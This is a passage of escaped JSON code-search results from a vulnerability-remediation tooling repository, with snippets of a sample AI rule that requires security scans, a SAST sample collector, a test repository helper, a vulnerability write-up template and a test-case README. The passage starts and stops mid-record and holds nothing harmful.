'@mobb/components'\\",\\"lineNumber\\":11},{\\"text\\":\\"import { useState } from 'react'\\",\\"lineNumber\\":12},{\\"text\\":\\"import { useSearchParams } from 'react-router-dom'\\",\\"lineNumber\\":13},{\\"lineNumber\\":14},{\\"text\\":\\"const sampleRule = \`---\\",\\"lineNumber\\":15},{\\"text\\":\\"alwaysApply: true\\",\\"lineNumber\\":16},{\\"text\\":\\"---\\",\\"lineNumber\\":17},{\\"text\\":\\"# Security Rules for Mobb Vulnerability Scanning\\",\\"lineNumber\\":18},{\\"text\\":\\"## MANDATORY: Mobb Scan Protocol\\",\\"lineNumber\\":19},{\\"text\\":\\"**CRITICAL**: After implementing any new features or making code changes, you MUST:\\",\\"lineNumber\\":20},{\\"text\\":\\"1. **ALWAYS run Mobb scan after implementation**: Use \\\\\\\\\`mcp_mobb-mcp_scan_and_fix_vulnerabilities\\\\\\\\\` tool to scan the new/modified code\\",\\"lineNumber\\":21},{\\"text\\":\\"2. **Add security rules**: For EVERY fix produced by Mobb, add a new generic security rule to a separate rule file in \\\\\\\\\`.cursor/rules/\\\\\\\\\` to prevent the vulnerability type from recurring\\",\\"lineNumber\\":22},{\\"text\\":\\"3. **Document the process**: Always explain what security measures were taken and any vulnerabilities found\\",\\"lineNumber\\":23},{\\"text\\":\\"## Rule Addition Protocol\\",\\"lineNumber\\":24},{\\"text\\":\\"When Mobb produces a fix:\\",\\"lineNumber\\":25},{\\"text\\":\\"- Extract the vulnerability type (e.g., \\\\\\"Command Injection\\\\\\", \\\\\\"SQL Injection\\\\\\", \\\\\\"XSS\\\\\\")\\",\\"lineNumber\\":26},{\\"text\\":\\"- Create a generic prevention rule for that vulnerability type\\",\\"lineNumber\\":27},{\\"text\\":\\"- **If rule file exists**: Add new information to the existing \\\\\\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\\\\\` file\\",\\"lineNumber\\":28},{\\"text\\":\\"- **If rule file doesn't exist**: Create a new rule file: \\\\\\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\\\\\` (e.g., \\\\\\\\\`command-injection.mdc\\\\\\\\\`)\\",\\"lineNumber\\":29},{\\"text\\":\\"- Add the rule with clear, actionable guidance and \\\\\\\\\`alwaysApply: true\\\\\\\\\`\\",\\"lineNumber\\":30},{\\"text\\":\\"- Make the rule specific enough to prevent the issue but generic enough to apply broadly\\",\\"lineNumber\\":31},{\\"text\\":\\"- Update the main security.mdc to reference the rule file (if it's new)\\",\\"lineNumber\\":32},{\\"text\\":\\"## Active Security Rules\\",\\"lineNumber\\":33},{\\"text\\":\\"## Enforcement\\",\\"lineNumber\\":34},{\\"text\\":\\"- This rule is ALWAYS APPLIED and cannot be bypassed\\",\\"lineNumber\\":35},{\\"text\\":\\"- Any AI assistant that fails to follow this protocol should be corrected immediately\\",\\"lineNumber\\":36},{\\"text\\":\\"- Team members should verify that security scans are run before code reviews\`\\",\\"lineNumber\\":37},{\\"lineNumber\\":38},{\\"text\\":\\"export function GenerateAIRule() {\\",\\"lineNumber\\":39,\\"isSignature\\":true},{\\"text\\":\\"  const [searchParams] = useSearchParams()\\",\\"lineNumber\\":40},{\\"text\\":\\"}\\",\\"lineNumber\\":154,\\"isSignature\\":true}]},\\"score\\":0.28029704093933105},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":233},\\"endPosition\\":{\\"line\\":339}},\\"contents\\":\\"\\\\n\\\\n\\\\nasync def main(\\\\n    input_config_abs_path: str = str(SCRIPT_PATH / \\\\\\"../sampler_config.json\\\\\\"),\\\\n):\\\\n    with open(input_config_abs_path, \\\\\\"r\\\\\\") as f:\\\\n        input_config = SamplerConfig.from_json(f.read())\\\\n\\\\n    print(f\\\\\\"Sampler config: {input_config}\\\\\\")\\\\n    print(f\\\\\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\\\\\")\\\\n\\\\n    samples = []\\\\n\\\\n    samples += await _get_customer_report_samples(input_config)\\\\n    samples += await _get_dataset_samples(input_config)\\\\n\\\\n    samples = samples[0 : input_config.max_sample_count]\\\\n\\\\n    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\\\n\\\\n    if sast_issue_type_used != set(input_config.sast_issue_types):\\\\n        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\\\n        print(\\\\n            f\\\\\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\\\\\"\\\\n        )\\\\n\\\\n    await _save_output(input_config, samples)\\\\n    print(\\\\\\"Done\\\\\\")\\",\\"originalContents\\":\\"\\\\n\\\\n\\\\nasync def main(\\\\n    input_config_abs_path: str = str(SCRIPT_PATH / \\\\\\"../sampler_config.json\\\\\\"),\\\\n):\\\\n    with open(input_config_abs_path, \\\\\\"r\\\\\\") as f:\\\\n        input_config = SamplerConfig.from_json(f.read())\\\\n\\\\n    print(f\\\\\\"Sampler config: {input_config}\\\\\\")\\\\n    print(f\\\\\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\\\\\")\\\\n\\\\n    samples = []\\\\n\\\\n    samples += await _get_customer_report_samples(input_config)\\\\n    samples += await _get_dataset_samples(input_config)\\\\n\\\\n    samples = samples[0 : input_config.max_sample_count]\\\\n\\\\n    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\\\n\\\\n    if sast_issue_type_used != set(input_config.sast_issue_types):\\\\n        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\\\n        print(\\\\n            f\\\\\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\\\\\"\\\\n        )\\\\n\\\\n    await _save_output(input_config, samples)\\\\n    print(\\\\\\"Done\\\\\\")\\",\\"detailedLines\\":[{\\"text\\":\\"@dataclass\\",\\"lineNumber\\":234},{\\"text\\":\\"class Sample:\\",\\"lineNumber\\":235,\\"isSignature\\":true},{\\"lineNumber\\":237},{\\"text\\":\\"    report_path: str\\",\\"lineNumber\\":238},{\\"text\\":\\"    source_archive_path: str\\",\\"lineNumber\\":239},{\\"text\\":\\"    is_public: bool\\",\\"lineNumber\\":240,\\"isSignature\\":true},{\\"lineNumber\\":241},{\\"lineNumber\\":242},{\\"text\\":\\"async def main(\\",\\"lineNumber\\":243,\\"isSignature\\":true},{\\"text\\":\\"    input_config_abs_path: str = str(SCRIPT_PATH / \\\\\\"../sampler_config.json\\\\\\"),\\",\\"lineNumber\\":244,\\"isSignature\\":true},{\\"text\\":\\"):\\",\\"lineNumber\\":245,\\"isSignature\\":true},{\\"text\\":\\"    with open(input_config_abs_path, \\\\\\"r\\\\\\") as f:\\",\\"lineNumber\\":246},{\\"text\\":\\"        input_config = SamplerConfig.from_json(f.read())\\",\\"lineNumber\\":247},{\\"lineNumber\\":248},{\\"text\\":\\"    print(f\\\\\\"Sampler config: {input_config}\\\\\\")\\",\\"lineNumber\\":249},{\\"text\\":\\"    print(f\\\\\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\\\\\")\\",\\"lineNumber\\":250},{\\"lineNumber\\":251},{\\"text\\":\\"    samples = []\\",\\"lineNumber\\":252},{\\"lineNumber\\":253},{\\"text\\":\\"    samples += await _get_customer_report_samples(input_config)\\",\\"lineNumber\\":254},{\\"text\\":\\"    samples += await _get_dataset_samples(input_config)\\",\\"lineNumber\\":255},{\\"lineNumber\\":256},{\\"text\\":\\"    samples = samples[0 : input_config.max_sample_count]\\",\\"lineNumber\\":257},{\\"lineNumber\\":258},{\\"text\\":\\"    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\",\\"lineNumber\\":259},{\\"lineNumber\\":260},{\\"text\\":\\"    if sast_issue_type_used != set(input_config.sast_issue_types):\\",\\"lineNumber\\":261},{\\"text\\":\\"        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\",\\"lineNumber\\":262},{\\"text\\":\\"        print(\\",\\"lineNumber\\":263},{\\"text\\":\\"            f\\\\\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\\\\\"\\",\\"lineNumber\\":264},{\\"text\\":\\"        )\\",\\"lineNumber\\":265},{\\"lineNumber\\":266},{\\"text\\":\\"    await _save_output(input_config, samples)\\",\\"lineNumber\\":267},{\\"text\\":\\"    print(\\\\\\"Done\\\\\\")\\",\\"lineNumber\\":268,\\"isSignature\\":true},{\\"lineNumber\\":269},{\\"lineNumber\\":270},{\\"text\\":\\"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\",\\"lineNumber\\":271,\\"isSignature\\":true},{\\"text\\":\\"    \\",\\"lineNumber\\":272}]},\\"score\\":0.2794812321662903},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"clients/cli/__tests__/mcp/helpers/MockRepo.ts\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":464,\\"column\\":1}},\\"contents\\":\\"import * as path2 from 'node:path'\\\\n\\\\nimport { execFileSync, execSync } from 'child_process'\\\\nimport fs, {\\\\n  existsSync,\\\\n  mkdirSync,\\\\n  mkdtempSync,\\\\n  readFileSync,\\\\n  rmSync,\\\\n  utimesSync,\\\\n  writeFileSync,\\\\n} from 'fs'\\\\nimport { tmpdir } from 'os'\\\\nimport { dirname, join } from 'path'\\\\nimport simpleGit from 'simple-git'\\\\n\\\\nimport { benignFileContent } from './fileContents'\\\\nimport { log } from './log'\\\\n\\\\n/**\\\\n * Base MockRepo class that encapsulates helper methods for creating and cleaning up\\\\n * temporary repositories that are used throughout the test suites.\\\\n */\\\\nexport class MockRepo {\\\\n  /** Holds the path of the temporary repository managed by this instance */\\\\n  protected readonly repoPath: string\\\\n\\\\n  /** Holds the remote URL of the repository (if it's a git repo) */\\\\n  protected repoUrl: string = ''\\\\n\\\\n  /** Default set of sample files used by multiple helpers */\\\\n  protected readonly sampleFiles: string[] = [\\\\n    'sample1.py',\\\\n    'dir/sample2.py',\\\\n    'dir/dir2/sample3.py',\\\\n  ]\\\\n\\\\n  /** The list of files to create in the repository */\\\\n  protected readonly files: string[]\\\\n\\\\n  /** Path to the sample .gitignore file */\\\\n  protected readonly sampleGitignorePath = join(\\\\n    __dirname,\\\\n    '..',\\\\n    'mocks',\\\\n    'sample.gitignore'\\\\n  )\\\\n\\\\n  /**\\\\n   * Creates a new MockRepo instance\\\\n   * @param files Optional list of files to create in the repository (defaults to sampleFiles)\\\\n   * @param customPath Optional custom path for the repository. If not provided, a temporary directory will be created.\\\\n   */\\\\n  constructor(files?: string[], customPath?: string) {\\\\n    // Use provided files or default to sampleFiles\\\\n    this.files = files || this.sampleFiles\\\\n\\\\n    // Use custom path or create a temporary directory\\\\n    this.repoPath = customPath || mkdtempSync(join(tmpdir(), 'mcp-test-repo-'))\\\\n    log('Created repository directory at:', this.repoPath)\\\\n  }\\",\\"originalContents\\":\\"import * as path2 from 'node:path'\\\\n\\\\nimport { execFileSync, execSync } from 'child_process'\\\\nimport fs, {\\\\n  existsSync,\\\\n  mkdirSync,\\\\n  mkdtempSync,\\\\n  readFileSync,\\\\n  rmSync,\\\\n  utimesSync,\\\\n  writeFileSync,\\\\n} from 'fs'\\\\nimport { tmpdir } from 'os'\\\\nimport { dirname, join } from 'path'\\\\nimport simpleGit from 'simple-git'\\\\n\\\\nimport { benignFileContent } from './fileContents'\\\\nimport { log } from './log'\\\\n\\\\n/**\\\\n * Base MockRepo class that encapsulates helper methods for creating and cleaning up\\\\n * temporary repositories that are used throughout the test suites.\\\\n */\\\\nexport class MockRepo {\\\\n  /** Holds the path of the temporary repository managed by this instance */\\\\n  protected readonly repoPath: string\\\\n\\\\n  /** Holds the remote URL of the repository (if it's a git repo) */\\\\n  protected repoUrl: string = ''\\\\n\\\\n  /** Default set of sample files used by multiple helpers */\\\\n  protected readonly sampleFiles: string[] = [\\\\n    'sample1.py',\\\\n    'dir/sample2.py',\\\\n    'dir/dir2/sample3.py',\\\\n  ]\\\\n\\\\n  /** The list of files to create in the repository */\\\\n  protected readonly files: string[]\\\\n\\\\n  /** Path to the sample .gitignore file */\\\\n  protected readonly sampleGitignorePath = join(\\\\n    __dirname,\\\\n    '..',\\\\n    'mocks',\\\\n    'sample.gitignore'\\\\n  )\\\\n\\\\n  /**\\\\n   * Creates a new MockRepo instance\\\\n   * @param files Optional list of files to create in the repository (defaults to sampleFiles)\\\\n   * @param customPath Optional custom path for the repository. If not provided, a temporary directory will be created.\\\\n   */\\\\n  constructor(files?: string[], customPath?: string) {\\\\n    // Use provided files or default to sampleFiles\\\\n    this.files = files || this.sampleFiles\\\\n\\\\n    // Use custom path or create a temporary directory\\\\n    this.repoPath = customPath || mkdtempSync(join(tmpdir(), 'mcp-test-repo-'))\\\\n    log('Created repository directory at:', this.repoPath)\\\\n  }\\",\\"detailedLines\\":[{\\"text\\":\\"import * as path2 from 'node:path'\\",\\"lineNumber\\":1},{\\"lineNumber\\":2},{\\"text\\":\\"import { execFileSync, execSync } from 'child_process'\\",\\"lineNumber\\":3},{\\"text\\":\\"import fs, {\\",\\"lineNumber\\":4},{\\"text\\":\\"  existsSync,\\",\\"lineNumber\\":5},{\\"text\\":\\"  mkdirSync,\\",\\"lineNumber\\":6},{\\"text\\":\\"  mkdtempSync,\\",\\"lineNumber\\":7},{\\"text\\":\\"  readFileSync,\\",\\"lineNumber\\":8},{\\"text\\":\\"  rmSync,\\",\\"lineNumber\\":9},{\\"text\\":\\"  utimesSync,\\",\\"lineNumber\\":10},{\\"text\\":\\"  writeFileSync,\\",\\"lineNumber\\":11},{\\"text\\":\\"} from 'fs'\\",\\"lineNumber\\":12},{\\"text\\":\\"import { tmpdir } from 'os'\\",\\"lineNumber\\":13},{\\"text\\":\\"import { dirname, join } from 'path'\\",\\"lineNumber\\":14},{\\"text\\":\\"import simpleGit from 'simple-git'\\",\\"lineNumber\\":15},{\\"lineNumber\\":16},{\\"text\\":\\"import { benignFileContent } from './fileContents'\\",\\"lineNumber\\":17},{\\"text\\":\\"import { log } from './log'\\",\\"lineNumber\\":18},{\\"lineNumber\\":19},{\\"text\\":\\"/**\\",\\"lineNumber\\":20},{\\"text\\":\\" * Base MockRepo class that encapsulates helper methods for creating and cleaning up\\",\\"lineNumber\\":21},{\\"text\\":\\" * temporary repositories that are used throughout the test suites.\\",\\"lineNumber\\":22},{\\"text\\":\\" */\\",\\"lineNumber\\":23},{\\"text\\":\\"export class MockRepo {\\",\\"lineNumber\\":24,\\"isSignature\\":true},{\\"text\\":\\"  /** Holds the path of the temporary repository managed by this instance */\\",\\"lineNumber\\":25},{\\"text\\":\\"  protected readonly repoPath: string\\",\\"lineNumber\\":26},{\\"lineNumber\\":27},{\\"text\\":\\"  /** Holds the remote URL of the repository (if it's a git repo) */\\",\\"lineNumber\\":28},{\\"text\\":\\"  protected repoUrl: string = ''\\",\\"lineNumber\\":29},{\\"lineNumber\\":30},{\\"text\\":\\"  /** Default set of sample files used by multiple helpers */\\",\\"lineNumber\\":31},{\\"text\\":\\"  protected readonly sampleFiles: string[] = [\\",\\"lineNumber\\":32},{\\"text\\":\\"    'sample1.py',\\",\\"lineNumber\\":33},{\\"text\\":\\"    'dir/sample2.py',\\",\\"lineNumber\\":34},{\\"text\\":\\"    'dir/dir2/sample3.py',\\",\\"lineNumber\\":35},{\\"text\\":\\"  ]\\",\\"lineNumber\\":36},{\\"lineNumber\\":37},{\\"text\\":\\"  /** The list of files to create in the repository */\\",\\"lineNumber\\":38},{\\"text\\":\\"  protected readonly files: string[]\\",\\"lineNumber\\":39},{\\"lineNumber\\":40},{\\"text\\":\\"  /** Path to the sample .gitignore file */\\",\\"lineNumber\\":41},{\\"text\\":\\"  protected readonly sampleGitignorePath = join(\\",\\"lineNumber\\":42},{\\"text\\":\\"    __dirname,\\",\\"lineNumber\\":43},{\\"text\\":\\"    '..',\\",\\"lineNumber\\":44},{\\"text\\":\\"    'mocks',\\",\\"lineNumber\\":45},{\\"text\\":\\"    'sample.gitignore'\\",\\"lineNumber\\":46},{\\"text\\":\\"  )\\",\\"lineNumber\\":47},{\\"lineNumber\\":48},{\\"text\\":\\"  /**\\",\\"lineNumber\\":49},{\\"text\\":\\"   * Creates a new MockRepo instance\\",\\"lineNumber\\":50},{\\"text\\":\\"   * @param files Optional list of files to create in the repository (defaults to sampleFiles)\\",\\"lineNumber\\":51},{\\"text\\":\\"   * @param customPath Optional custom path for the repository. If not provided, a temporary directory will be created.\\",\\"lineNumber\\":52},{\\"text\\":\\"   */\\",\\"lineNumber\\":53},{\\"text\\":\\"  constructor(files?: string[], customPath?: string) {\\",\\"lineNumber\\":54},{\\"text\\":\\"    // Use provided files or default to sampleFiles\\",\\"lineNumber\\":55},{\\"text\\":\\"    this.files = files || this.sampleFiles\\",\\"lineNumber\\":56},{\\"lineNumber\\":57},{\\"text\\":\\"    // Use custom path or create a temporary directory\\",\\"lineNumber\\":58},{\\"text\\":\\"    this.repoPath = customPath || mkdtempSync(join(tmpdir(), 'mcp-test-repo-'))\\",\\"lineNumber\\":59},{\\"text\\":\\"    log('Created repository directory at:', this.repoPath)\\",\\"lineNumber\\":60},{\\"text\\":\\"  }\\",\\"lineNumber\\":61},{\\"lineNumber\\":62},{\\"text\\":\\"  /**\\",\\"lineNumber\\":63},{\\"text\\":\\"   * Returns the path to the created repository\\",\\"lineNumber\\":64},{\\"text\\":\\"   * @returns Path to the repository\\",\\"lineNumber\\":65},{\\"text\\":\\"   */\\",\\"lineNumber\\":66},{\\"text\\":\\"}\\",\\"lineNumber\\":465,\\"isSignature\\":true}]},\\"score\\":0.27924689650535583},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/generator/templates/vulnerability_template.md.txt\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":62}},\\"contents\\":\\"# {vuln_name}\\\\n\\\\n## 1. Vulnerability Description\\\\n\\\\n[Describe the vulnerability here]\\\\n\\\\n## 2. How It Works\\\\n\\\\n[Explain how the vulnerability works]\\\\n\\\\n## 3. Vulnerable Code Examples\\\\n\\\\n### Example 1\\\\n\`\`\`{language}\\\\n// Add vulnerable code example here\\\\n\`\`\`\\\\n\\\\n## 4. Remediation Strategies\\\\n\\\\n### Safe Code Examples\\\\n\`\`\`{language}\\\\n// Add safe code example here\\\\n\`\`\`\\\\n\\\\n## 5. False Positives Detection\\\\n\\\\n### More Safe Code Examples\\\\n\`\`\`{language}\\\\n// Add more safe code example here or refer to previous examples\\\\n\`\`\`\\\\n\\\\n### Detected by\\\\n\\\\n* [Add screenshots from highlight nodes here]\\\\n\\\\n### Respected by\\\\n\\\\n* SAST provider name\\\\n* ...\\\\n\\\\n## 5. Other Information\\\\n\\\\n### Required Imports and Packages\\\\n\\\\nNone\\\\n\\\\n### User Questions\\\\n\\\\nNone\\\\n\\\\n### Open Items\\\\n\\\\nNone\\\\n\\\\n### Read More\\\\n\\\\n* https://deu.ast.checkmarx.net/presets/sast\\\\n* https://codeql.github.com/codeql-query-help/python/\\\\n* https://vulncat.fortify.com/en/weakness?codelang=Java%2FJSP&q=System%20Information%20Leak\\\\n* https://semgrep.dev/r?q=html.security.audit.missing-integrity.missing-integrity\\\\n* https://docs.snyk.io/scan-with-snyk/snyk-code/snyk-code-security-rules/python-rules\\\\n* https://rules.sonarsource.com/python/\\\\n\\",\\"originalContents\\":\\"# {vuln_name}\\\\n\\\\n## 1. Vulnerability Description\\\\n\\\\n[Describe the vulnerability here]\\\\n\\\\n## 2. How It Works\\\\n\\\\n[Explain how the vulnerability works]\\\\n\\\\n## 3. Vulnerable Code Examples\\\\n\\\\n### Example 1\\\\n\`\`\`{language}\\\\n// Add vulnerable code example here\\\\n\`\`\`\\\\n\\\\n## 4. Remediation Strategies\\\\n\\\\n### Safe Code Examples\\\\n\`\`\`{language}\\\\n// Add safe code example here\\\\n\`\`\`\\\\n\\\\n## 5. False Positives Detection\\\\n\\\\n### More Safe Code Examples\\\\n\`\`\`{language}\\\\n// Add more safe code example here or refer to previous examples\\\\n\`\`\`\\\\n\\\\n### Detected by\\\\n\\\\n* [Add screenshots from highlight nodes here]\\\\n\\\\n### Respected by\\\\n\\\\n* SAST provider name\\\\n* ...\\\\n\\\\n## 5. Other Information\\\\n\\\\n### Required Imports and Packages\\\\n\\\\nNone\\\\n\\\\n### User Questions\\\\n\\\\nNone\\\\n\\\\n### Open Items\\\\n\\\\nNone\\\\n\\\\n### Read More\\\\n\\\\n* https://deu.ast.checkmarx.net/presets/sast\\\\n* https://codeql.github.com/codeql-query-help/python/\\\\n* https://vulncat.fortify.com/en/weakness?codelang=Java%2FJSP&q=System%20Information%20Leak\\\\n* https://semgrep.dev/r?q=html.security.audit.missing-integrity.missing-integrity\\\\n* https://docs.snyk.io/scan-with-snyk/snyk-code/snyk-code-security-rules/python-rules\\\\n* https://rules.sonarsource.com/python/\\\\n\\",\\"detailedLines\\":[{\\"text\\":\\"# {vuln_name}\\",\\"lineNumber\\":1},{\\"lineNumber\\":2},{\\"text\\":\\"## 1. Vulnerability Description\\",\\"lineNumber\\":3},{\\"lineNumber\\":4},{\\"text\\":\\"[Describe the vulnerability here]\\",\\"lineNumber\\":5},{\\"lineNumber\\":6},{\\"text\\":\\"## 2. How It Works\\",\\"lineNumber\\":7},{\\"lineNumber\\":8},{\\"text\\":\\"[Explain how the vulnerability works]\\",\\"lineNumber\\":9},{\\"lineNumber\\":10},{\\"text\\":\\"## 3. Vulnerable Code Examples\\",\\"lineNumber\\":11},{\\"lineNumber\\":12},{\\"text\\":\\"### Example 1\\",\\"lineNumber\\":13},{\\"text\\":\\"\`\`\`{language}\\",\\"lineNumber\\":14},{\\"text\\":\\"// Add vulnerable code example here\\",\\"lineNumber\\":15},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":16},{\\"lineNumber\\":17},{\\"text\\":\\"## 4. Remediation Strategies\\",\\"lineNumber\\":18},{\\"lineNumber\\":19},{\\"text\\":\\"### Safe Code Examples\\",\\"lineNumber\\":20},{\\"text\\":\\"\`\`\`{language}\\",\\"lineNumber\\":21},{\\"text\\":\\"// Add safe code example here\\",\\"lineNumber\\":22},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":23},{\\"lineNumber\\":24},{\\"text\\":\\"## 5. False Positives Detection\\",\\"lineNumber\\":25},{\\"lineNumber\\":26},{\\"text\\":\\"### More Safe Code Examples\\",\\"lineNumber\\":27},{\\"text\\":\\"\`\`\`{language}\\",\\"lineNumber\\":28},{\\"text\\":\\"// Add more safe code example here or refer to previous examples\\",\\"lineNumber\\":29},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":30},{\\"lineNumber\\":31},{\\"text\\":\\"### Detected by\\",\\"lineNumber\\":32},{\\"lineNumber\\":33},{\\"text\\":\\"* [Add screenshots from highlight nodes here]\\",\\"lineNumber\\":34},{\\"lineNumber\\":35},{\\"text\\":\\"### Respected by\\",\\"lineNumber\\":36},{\\"lineNumber\\":37},{\\"text\\":\\"* SAST provider name\\",\\"lineNumber\\":38},{\\"text\\":\\"* ...\\",\\"lineNumber\\":39},{\\"lineNumber\\":40},{\\"text\\":\\"## 5. Other Information\\",\\"lineNumber\\":41},{\\"lineNumber\\":42},{\\"text\\":\\"### Required Imports and Packages\\",\\"lineNumber\\":43},{\\"lineNumber\\":44},{\\"text\\":\\"None\\",\\"lineNumber\\":45},{\\"lineNumber\\":46},{\\"text\\":\\"### User Questions\\",\\"lineNumber\\":47},{\\"lineNumber\\":48},{\\"text\\":\\"None\\",\\"lineNumber\\":49},{\\"lineNumber\\":50},{\\"text\\":\\"### Open Items\\",\\"lineNumber\\":51},{\\"lineNumber\\":52},{\\"text\\":\\"None\\",\\"lineNumber\\":53},{\\"lineNumber\\":54},{\\"text\\":\\"### Read More\\",\\"lineNumber\\":55},{\\"lineNumber\\":56},{\\"text\\":\\"* https://deu.ast.checkmarx.net/presets/sast\\",\\"lineNumber\\":57},{\\"text\\":\\"* https://codeql.github.com/codeql-query-help/python/\\",\\"lineNumber\\":58},{\\"text\\":\\"* https://vulncat.fortify.com/en/weakness?codelang=Java%2FJSP&q=System%20Information%20Leak\\",\\"lineNumber\\":59},{\\"text\\":\\"* https://semgrep.dev/r?q=html.security.audit.missing-integrity.missing-integrity\\",\\"lineNumber\\":60},{\\"text\\":\\"* https://docs.snyk.io/scan-with-snyk/snyk-code/snyk-code-security-rules/python-rules\\",\\"lineNumber\\":61},{\\"text\\":\\"* https://rules.sonarsource.com/python/\\",\\"lineNumber\\":62}]},\\"score\\":0.2715897858142853},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"consumers/analyzer/tests/assets/python/wildcard_imports/README.md\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":50}},\\"contents\\":\\"# Python Wildcard Import Test Cases\\\\n\\\\nThis directory contains various test cases demonstrating different patterns of wildcard imports (\`from module import *\`) in Python. These examples are used to test the wildcard import analyzer and fixer.\\\\n\\\\n## Test Cases\\\\n\\\\n### 1. basic_math\\\\n- **File**: \`calculator.py\`\\\\n- **Description**: Basic usage of wildcard import from the \`math\` module\\\\n- **Pattern**: \`from math import *\`\\\\n- **Usage**: Mathematical functions like \`sin()\`, \`cos()\`, \`sqrt()\`, \`exp()\`, constants like \`pi\`, \`e\`\\\\n\\\\n### 2. collections_abc\\\\n- **File**: \`containers.py\`\\\\n- **Description**: Wildcard imports from \`collections\` and abstract base classes\\\\n- **Patterns**: \\\\n  - \`from collections import *\`\\\\n  - \`from collections.abc import *\`\\\\n  - \`from abc import *\`\\\\n- **Usage**: Container types, abstract base classes, decorators\\\\n\\\\n### 3. datetime_time\\\\n- **File**: \`scheduler.py\`\\\\n- **Description**: Time and date manipulation with multiple wildcard imports\\\\n- **Patterns**:\\\\n  - \`from datetime import *\`\\\\n  - \`from time import *\`\\\\n  - \`from calendar import *\`\\\\n- **Usage**: Scheduling, time zones, calendar operations\\\\n\\\\n### 4. fabric_deployment\\\\n- **File**: \`deploy.py\`\\\\n- **Description**: Real-world deployment script using Fabric with extensive functionality\\\\n- **Pattern**: \`from fabric.api import *\`\\\\n- **Usage**: Server deployment automation with 400+ lines of deployment logic\\\\n- **Special Note**: This mimics the real-world issue where AI removed ~500 lines of code after fixing the import\\\\n\\\\n### 5. local_package\\\\n- **Files**: \`main.py\`, \`utils.py\`, \`helpers.py\`\\\\n- **Description**: Wildcard imports from local modules in the same package\\\\n- **Patterns**:\\\\n  - \`from utils import *\`\\\\n  - \`from helpers import *\`\\\\n- **Usage**: Application using various utilities and helper functions from local modules\\\\n\\\\n### 6. mixed_imports\\\\n- **File**: \`hybrid_imports.py\`\\\\n- **Description**: Mixing wildcard imports with explicit imports\\\\n\\",\\"originalContents\\":\\"# Python Wildcard Import Test Cases\\\\n\\\\nThis directory contains various test cases demonstrating different patterns of wildcard imports (\`from module import *\`) in Python. These examples are used to test the wildcard import analyzer and fixer.\\\\n\\\\n## Test Cases\\\\n\\\\n### 1. basic_math\\\\n- **File**: \`calculator.py\`\\\\n- **Description**: Basic usage of wildcard import from the \`math\` module\\\\n- **Pattern**: \`from math import *\`\\\\n- **Usage**: Mathematical functions like \`sin()\`, \`cos()\`, \`sqrt()\`, \`exp()\`, constants like \`pi\`, \`e\`\\\\n\\\\n### 2. collections_abc\\\\n- **File**: \`containers.py\`\\\\n- **Description**: Wildcard imports from \`collections\` and abstract base classes\\\\n- **Patterns**: \\\\n  - \`from collections import *\`\\\\n  - \`from collections.abc import *\`\\\\n  - \`from abc import *\`\\\\n- **Usage**: Container types, abstract base classes, decorators\\\\n\\\\n### 3. datetime_time\\\\n- **File**: \`scheduler.py\`\\\\n- **Description**: Time and date manipulation with multiple wildcard imports\\\\n- **Patterns**:\\\\n  - \`from datetime import *\`\\\\n  - \`from time import *\`\\\\n  - \`from calendar import *\`\\\\n- **Usage**: Scheduling, time zones, calendar operations\\\\n\\\\n### 4. fabric_deployment\\\\n- **File**: \`deploy.py\`\\\\n- **Description**: Real-world deployment script using Fabric with extensive functionality\\\\n- **Pattern**: \`from fabric.api import *\`\\\\n- **Usage**: Server deployment automation with 400+ lines of deployment logic\\\\n- **Special Note**: This mimics the real-world issue where AI removed ~500 lines of code after fixing the import\\\\n\\\\n### 5. local_package\\\\n- **Files**: \`main.py\`, \`utils.py\`, \`helpers.py\`\\\\n- **Description**: Wildcard imports from local modules in the same package\\\\n- **Patterns**:\\\\n  - \`from utils import *\`\\\\n  - \`from helpers import *\`\\\\n- **Usage**: Application using various utilities and helper functions from local modules\\\\n\\\\n### 6. mixed_imports\\\\n- **File**: \`hybrid_imports.py\`\\\\n- **Description**: Mixing wildcard imports with explicit imports\\\\n\\",\\"detailedLines\\":[{\\"text\\":\\"# Python Wildcard Import Test Cases\\",\\"lineNumber\\":1},{\\"lineNumber\\":2},{\\"text\\":\\"This directory contains various test cases demonstrating different patterns of wildcard imports (\`from module import *\`) in Python. These examples are used to test the wildcard import analyzer and fixer.\\",\\"lineNumber\\":3},{\\"lineNumber\\":4},{\\"text\\":\\"## Test Cases\\",\\"lineNumber\\":5},{\\"lineNumber\\":6},{\\"text\\":\\"### 1. basic_math\\",\\"lineNumber\\":7},{\\"text\\":\\"- **File**: \`calculator.py\`\\",\\"lineNumber\\":8},{\\"text\\":\\"- **Description**: Basic usage of wildcard import from the \`math\` module\\",\\"lineNumber\\":9},{\\"text\\":\\"- **Pattern**: \`from math import *\`\\",\\"lineNumber\\":10},{\\"text\\":\\"- **Usage**: Mathematical functions like \`sin()\`, \`cos()\`, \`sqrt()\`, \`exp()\`, constants like \`pi\`, \`e\`\\",\\"lineNumber\\":11},{\\"lineNumber\\":12},{\\"text\\":\\"### 2. 